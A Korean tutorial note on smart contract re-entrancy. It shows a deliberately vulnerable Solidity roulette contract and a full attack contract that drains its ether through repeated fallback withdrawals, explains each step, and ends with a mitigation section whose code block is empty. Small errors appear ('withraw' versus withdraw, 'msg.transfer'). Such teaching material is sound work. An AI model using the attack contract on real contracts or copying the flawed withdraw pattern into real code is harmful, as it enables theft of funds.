# 컨트랙트 보안

## 재진입 공격

Re-entrancy attack  

외부 컨트랙트 호출이 호출의 주체가 되는 컨트랙트로 다시 들어가는
악의적인 기능을 트리거할 때 발생하는 패턴  

```solidity
// 재진입 공격 가능한 컨트랙트 예시
contract HackableRoulette {
    mapping(address => uint) public balances;
    function betRed() payable {
        bool winner = (randomNumber() % 2 == 0);
        if(winner) balances[msg.sender] += msg.value * 2;
    }
    
    function randomNumber() returns (uint) { return 0; }
    
    function withraw() {
        uint amount = balances[msg.sender];
        msg.sender.call.value(amount)();
        balances[msg.sender] = 0;
    }
}
```

위 코드에서 사용자의 잔고를 0으로 만들기 전에 전송이 이루어진다.  
address.transfer() 대신에 address.call.value()를 사용하므로 
가스가 제한 없이 전달된다.  

즉, 인출되는 이더를 받는 컨트랙트는 HackableRoulette 컨트랙트를 
다시 호출하며 진입할 수 있으며, 재진입 시에 이더를 받는 컨트랙트의 잔고는 
여전히 전체 잔고가 된다.  

다음 예시는 이러한 보안 취약점을 이용해 HackableRoulette의 모든 이더를 
인출하는 컨트랙트이다.  

```solidity
contract ReEntrancyAttack {
    HackableRoulette public roulette;
    
    function ReEntrancyAttack(address rouletteAddress) {
        roulette = HackableRoulette(rouletteAddress);
    }
    
    function hack () payable {
        // 컨트랙트 잔고가 0 이상이고
        // 컨트랙트가 내기에 이길 때까지 빨간색에 베팅
        while(roulette.balances(address(this)) == 0) {
            roulette.betRed.value(msg.value)();
        }
        roulette.withdraw();
    }
    
    // HackableRoulette.withdraw가 폴백 호출
    function() payable {
        if (roulette.balance > roulette.balances(address(this)))
            roulette.withdraw();
    }
}
```
이 ReEntrancyAttack 컨트랙트는 HackableRoulette 컨트랙트의 주소를 
roulette에 할당하면서 인스턴스화 된다. 
hack() 함수를 호출하면 이 함수는 베팅 중 하나에서 이길 때까지 
betRed() 호출로 베팅을 계속한다.  

이는 HackableRoulette 컨트랙트에서 이더를 인출할 때 
HackableRoulette 컨트랙트의 내부 잔액이 0이 아니어야 하기 때문에 필요하다.  

잔액이 0이 아니게 되면 roulette.withdraw()를 호출해 withdarw 루프를 시작할 수 있다.  

roulette의 withdraw() 함수는 이더를 ReEntrancyAttack 컨트랙트로 보내고 
이는 폴백 함수를 트리거한다.  
폴백 함수는 또 다른 인출을 실행하며, 아직 잔고가 0이 아니기 때문에 HackableRoulette은 ReEntrancyAttack이 
전체 잔고를 다시 인출할 수 있게 한다.  

이 루프는 HackableRoulette의 컨트랙트 잔고가 ReEntrancyAttack의 내부 잔고보다 
적을 때까지 계속한다. 이 시점에서 더 이상 이더를 인출할 수 없게 된다.  

## 재진입 공격을 막는 방법

외부 컨트랙트를 호출하기 전에 잔고를 0으로 만들거나 
msg.transfer를 사용해 가스 한도를 제한하고 재진입을 방지하는 두 가지 방법이 있다.  

```solidity
// 
```